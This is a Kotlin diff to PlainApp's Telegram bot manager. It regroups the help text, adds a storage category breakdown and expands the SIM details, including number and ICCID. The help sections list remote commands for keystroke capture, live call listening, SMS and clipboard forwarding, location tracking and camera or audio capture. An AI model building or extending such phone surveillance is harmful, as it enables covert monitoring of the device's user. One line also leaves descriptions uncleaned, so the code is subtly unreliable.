@@ -1889,11 +1889,48 @@ object TelegramBotManager {
 
     private suspend fun cmdHelp() {
         sendTyping()
-        val sb = StringBuilder("📖 <b>PlainApp Bot — All Commands</b>\n\n")
-        allCommands.forEach { (cmd, desc) ->
-            sb.append("/<code>$cmd</code> — $desc\n")
+        data class Section(val header: String, val cmds: List<String>)
+        val sections = listOf(
+            Section("💬 Communication", listOf("messages","sms","sendsms","mms","schedulesms","calls","livecall","callnow","recordings","forwardsms")),
+            Section("👥 Contacts", listOf("contacts","find","addcontact","deletecontact","blocknumber")),
+            Section("📁 Files & Storage", listOf("files","storage","docs","find","filehash","deletefile")),
+            Section("📸 Media", listOf("screenshot","photo","audio","video","music","videos","images","shots","forwardphotos","forwardshots")),
+            Section("📱 Apps", listOf("apps","blockapp","unblockapp","blockedapps","launch","screentime","launches","clearcache")),
+            Section("📊 Device Info", listOf("device","battery","batteryhistory","batteryalert","location","sim","vpn","permissions","networkinfo","wifiscan","netusage")),
+            Section("🔧 Device Controls", listOf("wifi","hotspot","bluetooth","airplane","mobiledata","dnd","brightness","volume","torch","lockscreen","reboot")),
+            Section("🌀 Sensors", listOf("gyroscope","compass","barometer","steps","proximity","soundmeter")),
+            Section("🛰 Tracking & Monitoring", listOf("track","livelocation","tracklocation","keystrokes","keytop","geofence","forwardgeofence","timeline")),
+            Section("⚙️ Automation", listOf("automations","newrule","newschedule","delrule","runrule","togglerule")),
+            Section("📝 Productivity", listOf("notes","addnote","editnote","bookmarks","addbookmark","feeds","feedentries","pomodoro","clipboard","forwardclipboard","qrcode")),
+            Section("🔔 Notifications", listOf("notifications","mutenotifs","logs")),
+            Section("🚨 Alerts & Actions", listOf("findphone","vibrate","speak","stopspeak","toast","show","wake","setalarm","batteryalert")),
+            Section("⏰ Scheduling", listOf("schedulesms","setalarm","bedtime","newschedule")),
+            Section("📡 Auto-Forward", listOf("forwardsms","forwardphotos","forwardclipboard","forwardshots","forwardgeofence")),
+            Section("🤖 Bot", listOf("start","help","commands","stop","nowplaying")),
+        )
+        val cmdMap = allCommands.toMap()
+        val shown = mutableSetOf<String>()
+        val sb = StringBuilder("📖 <b>PlainApp Bot — Command Reference</b>\n")
+        sb.append("<i>${allCommands.size} commands total</i>\n\n")
+        for (section in sections) {
+            val sectionCmds = section.cmds.filter { it in cmdMap && shown.add(it) }
+            if (sectionCmds.isEmpty()) continue
+            sb.append("${section.header}\n")
+            for (cmd in sectionCmds) {
+                val desc = cmdMap[cmd] ?: continue
+                val cleanDesc = desc.replace(Regex("<[^>]+>"), "").substringBefore(" — ").let { desc }
+                sb.append("  /<code>$cmd</code> — $cleanDesc\n")
+            }
+            sb.append("\n")
         }
-        sb.append("\n💡 <i>Live alerts are auto-forwarded for calls, SMS & notifications.</i>")
+        // Any not yet shown
+        val remaining = allCommands.filter { it.first !in shown }
+        if (remaining.isNotEmpty()) {
+            sb.append("🔹 Other\n")
+            remaining.forEach { (cmd, desc) -> sb.append("  /<code>$cmd</code> — $desc\n") }
+            sb.append("\n")
+        }
+        sb.append("💡 <i>Live alerts auto-forward for calls, SMS, notifications & location.</i>")
         sendMessage(sb.toString())
     }
 
@@ -5557,8 +5594,7 @@ object TelegramBotManager {
                 val used = s.totalBytes - s.freeBytes
                 val pct = if (s.totalBytes > 0) (used * 100 / s.totalBytes).toInt() else 0
                 val bar = "█".repeat(pct / 10) + "░".repeat(10 - pct / 10)
-                sb.append("$label\n")
-                sb.append("  $bar $pct%\n")
+                sb.append("$label\n  $bar $pct%\n")
                 sb.append("  Used: <b>${humanSize(used)}</b>  Free: <b>${humanSize(s.freeBytes)}</b>  Total: ${humanSize(s.totalBytes)}\n\n")
             }
             formatLine("📱 Internal", internal)
@@ -5566,6 +5602,23 @@ object TelegramBotManager {
             if (sd.totalBytes > 0) formatLine("💳 SD Card", sd)
             val usbs = FileSystemHelper.getUSBStorageStats()
             usbs.forEachIndexed { i, u -> if (u.totalBytes > 0) formatLine("🔌 USB ${i + 1}", u) }
+            // Category breakdown
+            try {
+                val bd = SystemControlHelper.getStorageBreakdown()
+                sb.append("📊 <b>Category Breakdown</b>\n")
+                data class Cat(val icon: String, val label: String, val bytes: Long)
+                listOf(
+                    Cat("📱", "Apps", bd.appsBytes),
+                    Cat("🖼", "Images", bd.imagesBytes),
+                    Cat("🎬", "Videos", bd.videosBytes),
+                    Cat("🎵", "Audio", bd.audioBytes),
+                    Cat("📄", "Documents", bd.documentsBytes),
+                    Cat("🗑", "Cache", bd.cacheBytes),
+                    Cat("📦", "Other", bd.otherBytes),
+                ).filter { it.bytes > 0 }.forEach { c ->
+                    sb.append("  ${c.icon} ${c.label}: <b>${humanSize(c.bytes)}</b>\n")
+                }
+            } catch (_: Exception) {}
             sendMessage(sb.toString())
         } catch (e: Exception) {
             sendMessage("❌ Storage error: ${htmlEsc(e.message ?: "")}")
@@ -5577,15 +5630,26 @@ object TelegramBotManager {
     private fun cmdSim() {
         sendTyping()
         try {
-            val sims = SimHelper.getAll()
+            val sims = com.ismartcoding.plain.helpers.SimInfoHelper.getAll()
             if (sims.isEmpty()) {
-                sendMessage("📡 No SIM cards detected.")
+                sendMessage("📡 No SIM cards detected.\n<i>READ_PHONE_STATE permission may be required.</i>")
                 return
             }
-            val sb = StringBuilder("📡 <b>SIM Cards</b>\n━━━━━━━━━━━━━━━━━━━━\n")
-            sims.forEachIndexed { i, s ->
-                sb.append("${i + 1}. 📶 <b>${htmlEsc(s.label.ifBlank { "SIM ${i + 1}" })}</b>\n")
-                sb.append("   📱 <code>${htmlEsc(s.number.ifBlank { "(number hidden)" })}</code>\n\n")
+            val sb = StringBuilder("📡 <b>SIM Info</b>\n━━━━━━━━━━━━━━━━━━━━\n")
+            sims.forEach { s ->
+                val name = s.carrierName.ifBlank { s.operatorName.ifBlank { "SIM ${s.slotIndex + 1}" } }
+                sb.append("📶 <b>SIM ${s.slotIndex + 1}</b> — ${htmlEsc(name)}\n")
+                if (s.phoneNumber.isNotBlank()) sb.append("  📱 Number: <code>${htmlEsc(s.phoneNumber)}</code>\n")
+                sb.append("  📡 Network: <b>${htmlEsc(s.networkTypeName)}</b>\n")
+                if (s.mcc.isNotBlank() || s.mnc.isNotBlank()) sb.append("  MCC/MNC: <code>${s.mcc}/${s.mnc}</code>\n")
+                val filled = s.signalBars.coerceIn(0, 5)
+                sb.append("  📶 Signal: ${"█".repeat(filled)}${"░".repeat(5 - filled)} (${filled}/5)\n")
+                sb.append("  State: <b>${s.simState}</b>")
+                if (s.isRoaming) sb.append(" ⚠️ Roaming")
+                if (s.isDataActive) sb.append(" ✅ Data Active")
+                sb.append("\n")
+                if (s.iccid.isNotBlank()) sb.append("  ICCID: <code>${htmlEsc(s.iccid)}</code>\n")
+                sb.append("\n")
             }
             sendMessage(sb.toString())
         } catch (e: Exception) {
